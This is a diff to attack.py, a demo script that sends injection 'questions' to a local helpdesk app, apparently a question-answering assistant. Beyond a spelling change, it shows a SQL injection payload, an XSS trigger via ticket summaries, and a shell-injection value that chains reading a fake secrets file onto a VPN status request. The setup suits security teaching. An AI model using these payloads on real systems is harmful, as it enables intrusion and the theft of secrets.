@@ -6,7 +6,7 @@ attack.py: send the three attack questions to the helpdesk app and report what h
     python3 attack.py --only sql            # just one of the three (html, sql or shell)
 
 It calls the app's code directly (no browser needed). To see the XSS pop up in a real browser, run
-`python3 helpdesk_app.py` and ask "summarise my latest ticket" at http://127.0.0.1:8055.
+`python3 helpdesk_app.py` and ask "summarize my latest ticket" at http://127.0.0.1:8055.
 """
 
 import argparse
@@ -19,7 +19,7 @@ SEP = "&" if os.name == "nt" else ";"                       # how a shell chains
 READ = r"type data\fake_secrets.env" if os.name == "nt" else "cat data/fake_secrets.env"
 
 ATTACKS = [
-    ("HTML ", "summarise my latest ticket"),
+    ("HTML ", "summarize my latest ticket"),
     ("SQL  ", "search my tickets for: zzz' OR '1'='1' --"),
     ("SHELL", f"check the status of vpn{SEP} {READ}"),
 ]
